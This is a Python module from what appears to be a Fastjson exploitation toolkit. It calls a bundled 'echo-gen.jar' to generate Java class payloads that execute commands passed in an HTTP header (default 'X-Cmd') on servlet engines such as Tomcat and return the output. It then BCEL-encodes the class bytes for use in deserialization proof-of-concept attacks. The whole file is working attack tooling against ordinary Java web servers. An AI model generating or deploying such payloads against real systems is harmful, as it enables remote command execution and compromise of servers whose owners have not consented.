"""调用内置 echo-gen.jar（java-echo-generator 包装）。"""

from __future__ import annotations

import base64
import json
import os
import shutil
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Optional

_JAR_NAME = "echo-gen.jar"


@dataclass(frozen=True)
class EchoArtifact:
    class_name: str
    class_bytes: bytes
    class_b64: str
    bcel_code: str
    cmd_header: str
    engine: str
    source: str = ""

    def as_jar(self, entry_name: Optional[str] = None) -> bytes:
        import io
        import zipfile

        name = entry_name or f"{self.class_name}.class"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(name, self.class_bytes)
        return buf.getvalue()


def _package_jar_path() -> Path:
    return Path(__file__).resolve().parent / "jars" / _JAR_NAME


def _vendor_jar_path() -> Path:
    return (
        Path(__file__).resolve().parents[4]
        / "vendor"
        / "echo-gen"
        / "target"
        / _JAR_NAME
    )


def resolve_jar_path(explicit: Optional[str] = None) -> Path:
    if explicit:
        p = Path(explicit).expanduser().resolve()
        if p.is_file():
            return p
        raise FileNotFoundError(f"echo jar 不存在: {p}")
    env = (os.environ.get("FJ_ECHO_JAR") or "").strip()
    if env:
        p = Path(env).expanduser().resolve()
        if p.is_file():
            return p
        raise FileNotFoundError(f"FJ_ECHO_JAR 指向的文件不存在: {p}")
    pkg = _package_jar_path()
    if pkg.is_file():
        return pkg
    vendor = _vendor_jar_path()
    if vendor.is_file():
        return vendor
    raise FileNotFoundError(
        "未找到 echo-gen.jar。请先构建：\n"
        "  cd vendor/echo-gen && .\\build.ps1\n"
        "或设置环境变量 FJ_ECHO_JAR。"
    )


def _which_java() -> str:
    path = shutil.which("java")
    if not path:
        raise RuntimeError("未找到 java，请安装 JRE/JDK 并加入 PATH")
    return path


def _run_jar(action: str, stdin_text: Optional[str] = None, *, timeout: float = 60.0) -> dict[str, Any]:
    jar = resolve_jar_path()
    java = _which_java()
    cmd = [java, "-jar", str(jar), action]
    try:
        proc = subprocess.run(
            cmd,
            input=stdin_text.encode("utf-8") if stdin_text is not None else None,
            capture_output=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as e:
        raise RuntimeError(f"echo-gen.jar 超时 ({timeout}s)") from e
    raw = (proc.stdout or b"").decode("utf-8", errors="replace").strip()
    err = (proc.stderr or b"").decode("utf-8", errors="replace").strip()
    if not raw:
        raise RuntimeError(
            f"echo-gen.jar 无输出 (exit={proc.returncode})"
            + (f"\nstderr:\n{err}" if err else "")
        )
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"echo-gen.jar 返回非 JSON: {raw[:300]!r}") from e
    if isinstance(parsed, dict) and parsed.get("error"):
        raise RuntimeError(f"echo-gen error: {parsed['error']}")
    if proc.returncode != 0:
        raise RuntimeError(
            f"echo-gen.jar exit={proc.returncode}: {parsed!r}"
            + (f"\nstderr:\n{err}" if err else "")
        )
    if not isinstance(parsed, dict):
        raise RuntimeError(f"echo-gen.jar 响应类型异常: {type(parsed)}")
    return parsed


def generate_echo(
    *,
    engine: str = "tomcat",
    cmd_header: str = "X-Cmd",
    class_name: str = "EchoPayload",
    model: str = "Command",
    timeout: float = 60.0,
) -> EchoArtifact:
    body = {
        "engine": engine or "tomcat",
        "cmdHeader": cmd_header or "X-Cmd",
        "className": class_name or "EchoPayload",
        "model": model or "Command",
    }
    parsed = _run_jar("generate", json.dumps(body, separators=(",", ":")), timeout=timeout)
    result = parsed.get("echoResult")
    if not isinstance(result, dict) or not result.get("classBytesBase64"):
        raise RuntimeError(f"echo-gen 响应缺少 classBytesBase64: {str(parsed)[:300]!r}")
    class_b64 = result["classBytesBase64"]
    class_bytes = base64.b64decode(class_b64)
    if not class_bytes.startswith(b"\xca\xfe\xba\xbe"):
        raise RuntimeError("echo-gen 产物不是合法 .class")
    # 延迟导入，避免包初始化环
    from fastjson_toolkit.poc.bytecode.encode import bcel_code_from_class_bytes

    return EchoArtifact(
        class_name=str(result.get("className") or class_name),
        class_bytes=class_bytes,
        class_b64=class_b64,
        bcel_code=bcel_code_from_class_bytes(class_bytes),
        cmd_header=str(result.get("cmdHeader") or cmd_header),
        engine=str(result.get("engine") or engine),
        source="",
    )
